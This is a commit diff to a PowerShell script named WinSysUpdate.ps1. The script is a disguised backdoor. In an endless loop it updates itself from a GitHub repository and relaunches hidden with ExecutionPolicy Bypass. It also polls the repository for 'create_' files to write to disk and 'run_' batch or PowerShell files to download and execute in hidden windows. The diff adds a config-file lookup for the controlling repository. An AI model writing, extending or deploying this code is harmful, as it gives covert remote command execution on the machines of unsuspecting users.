48101b5fb98206c32e886722c05c5a8dede87120
catondachair-max <catondachair@gmail.com>
2026-02-10 15:32:03 +0100

    Update WinSysUpdate.ps1

--- WinSysUpdate.ps1
+++ WinSysUpdate.ps1
@@ -1,27 +1,34 @@
-$githubRepo = "[[URL]]" 
-$targetDir = "$env:APPDATA\WinData"
-$myPath = $PSCommandPath
+# --- UNIVERSAL WATCHER ---
+$dir = Split-Path $MyInvocation.MyCommand.Path
+$configFile = Join-Path $dir "config.txt"
+
+if (Test-Path $configFile) {
+    $conf = Get-Content $configFile
+    $user = $conf[0].Trim()
+    $repo = $conf[1].Trim()
+    $url = "https://raw.githubusercontent.com/$user/$repo/main"
+} else { exit }
 
 while($true) {
     try {
         # Self-Update
-        $remoteContent = Invoke-WebRequest -Uri "$githubRepo/WinSysUpdate.ps1" -UseBasicParsing | Select-Object -ExpandProperty Content
-        if ($remoteContent -and $remoteContent -ne (Get-Content $myPath -Raw)) {
-            Set-Content -Path $myPath -Value $remoteContent
-            Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$myPath`"" -WindowStyle Hidden
+        $remote = Invoke-WebRequest -Uri "$url/WinSysUpdate.ps1" -UseBasicParsing | Select-Object -ExpandProperty Content
+        if ($remote -and $remote -ne (Get-Content $MyInvocation.MyCommand.Path -Raw)) {
+            Set-Content -Path $MyInvocation.MyCommand.Path -Value $remote
+            Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`"" -WindowStyle Hidden
             exit
         }
-        # Check for commands
-        $files = Invoke-RestMethod -Uri "https://api.github.com/repos/[[USER]]/[[REPO]]/contents/"
-        foreach ($file in $files) {
-            $n = $file.name
-            $u = $file.download_url
+        # Check Commands
+        $files = Invoke-RestMethod -Uri "https://api.github.com/repos/$user/$repo/contents/"
+        foreach ($f in $files) {
+            $n = $f.name
+            $u = $f.download_url
             if ($n -like "create_*") {
                 $c = Invoke-WebRequest -Uri $u -UseBasicParsing | Select-Object -ExpandProperty Content
-                Set-Content -Path (Join-Path $targetDir ($n -replace "create_","")) -Value $c
+                Set-Content -Path (Join-Path $dir ($n -replace "create_","")) -Value $c
             }
             if ($n -like "run_*") {
-                $p = Join-Path $targetDir $n
+                $p = Join-Path $dir $n
                 Invoke-WebRequest -Uri $u -OutFile $p
                 if ($n -like "*.bat") { Start-Process cmd -ArgumentList "/c `"$p`"" -WindowStyle Hidden }
                 elseif ($n -like "*.ps1") { Start-Process powershell -ArgumentList "-File `"$p`"" -WindowStyle Hidden }
